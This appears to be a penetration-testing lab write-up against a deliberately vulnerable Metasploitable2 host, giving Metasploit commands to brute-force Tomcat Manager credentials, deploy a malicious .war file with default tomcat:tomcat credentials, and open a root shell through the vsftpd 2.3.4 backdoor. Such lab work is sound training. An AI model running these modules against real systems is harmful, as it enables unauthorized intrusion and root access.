# Lab: Exploiting Tomcat Manager with Metasploit

## Objective

The objective of this lab is to **exploit** the Tomcat Manager application on a target system running on port `8180`, using Metasploit. The goal is to demonstrate how to deploy malicious `.war` files and perform **credential brute-forcing** to gain unauthorized access to the service.

## Target Information

- **Target IP**: `192.168.56.101`
- **Port**: `8180` (Tomcat Manager)

---

## Lab Setup

In this lab, we exploit a vulnerable Tomcat Manager instance by performing the following steps:

### 1. **Exploitation Using Metasploit**

We use the `scanner/http/tomcat_mgr_login` module to **Brute-Force** the credentials to the Tomcat Manager service.

#### Step-by-Step Exploit Commands

First, configure Metasploit to target the Tomcat service on the target IP and port:
**using metasploit module**
```
msf auxiliary(scanner/http/tomcat_mgr_login) > set rhosts 192.168.56.101
msf auxiliary(scanner/http/tomcat_mgr_login) > set rport 8180
msf auxiliary(scanner/http/tomcat_mgr_login) > run
```

![Step 1](brute_8180.png)

We use the `multi/http/tomcat_mgr_deploy` module to exploit the Tomcat Manager service.
```bash
msf exploit(multi/http/tomcat_mgr_deploy) > set httpusername tomcat
msf exploit(multi/http/tomcat_mgr_deploy) > set httppassword tomcat
msf exploit(multi/http/tomcat_mgr_deploy) > set rhosts 192.168.56.101
msf exploit(multi/http/tomcat_mgr_deploy) > set rport 8180
msf exploit(multi/http/tomcat_mgr_deploy) > run
```

This will:
- Set the username and password for authentication (**tomcat:tomcat**).
- Set the target IP (**192.168.56.101**) and port (**8180**).
- Deploy a **malicious.war** file to the Tomcat Manager.

![Step 2](8180.png)

The exploit successfully uploaded and executed the .war file.

---

### Analyze the vsftpd 2.3.4 backdoor vulnerability
**Command Used:**
- msfconsole
- use exploit/unix/ftp/vsftpd_234_backdoor
- set RHOSTS 192.168.56.101
- run

**Result Confirmations**
The shell session output
![Step 3](vsftpd.png)

### Post-Exploitation Activity (Metasploitable2)
- Already running as root â†’ PrivEsc not required.
Metasploitable2 allows direct root shell access via multiple exploits. Privilege escalation step was skipped because the obtained shell was already running with UID 0.

### Evidence Collection (Task Requirement)
- **Command**
```
sha256sum /etc/passwd
```

Item        | Description      | Collected By   | Date         | Hash Value
------------|------------------|----------------|--------------|---------------------------------
Config File | /etc/passwd      | VAPT Analyst   | 2025-12-07   | af23ffe0bc5479a70a17e799fa699f9e593f2151b7e1ba597987523c7c733d42
